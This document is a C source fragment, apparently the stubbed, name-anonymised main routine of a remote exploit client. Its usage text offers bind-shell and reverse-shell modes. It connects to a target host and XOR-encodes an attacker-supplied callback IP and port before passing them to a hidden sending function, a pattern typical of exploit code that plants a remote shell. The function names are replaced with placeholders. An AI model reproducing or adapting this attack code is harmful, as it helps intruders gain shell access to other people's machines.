#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct in_addr {int dummy; } ;
struct sockaddr_in {unsigned short sin_port; struct in_addr sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int PORT ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC0 (char*) ; 
 int FUNC1 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int,unsigned long,unsigned short,int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*,char*,...) ; 
 struct hostent* FUNC5 (char*) ; 
 unsigned short FUNC6 (int) ; 
 unsigned long FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int FUNC9 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 

int
FUNC10 ( int argc, char* argv[] )
{
	int s;
	unsigned long cbip;
	unsigned short cbport;
	struct sockaddr_in remote_addr;
	struct hostent* host_addr;

	if ( argc != 2 )
		if ( argc != 4 )
			{ FUNC4 ( stderr, "Usage\n-----\n[bindshell] %s <ip>\n[reverseshell] %s <ip> <cbip> <cbport>\n", argv[0], argv[0] ); FUNC2 ( 1 ); }

	if ( ( host_addr = FUNC5 ( argv[1] ) ) == NULL )
		{ FUNC4 ( stderr, "Cannot resolve hostname: %s\n", argv[1] ); FUNC2 ( 1 ); }

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = FUNC6 ( PORT );

	s = FUNC9 ( AF_INET, SOCK_STREAM, 0 );
	FUNC8 ( "connecting to %s:%u...", argv[1], PORT );
	if ( FUNC1 ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
		{ FUNC8 ( "failed!\n" ); FUNC2 ( 1 ); }
	FUNC8 ( "ok!\n" );

	if ( argc == 4 )
	{
		cbip = FUNC7 ( argv[2] ) ^ ( unsigned long ) 0x99999999;
		cbport = FUNC6 ( FUNC0 ( argv[3] ) ) ^ ( unsigned short ) 0x9999;
		FUNC3 ( s, cbip, cbport, 0 );
	}
	else
		FUNC3 ( s, ( unsigned long ) NULL, ( unsigned short ) NULL, 1 );
}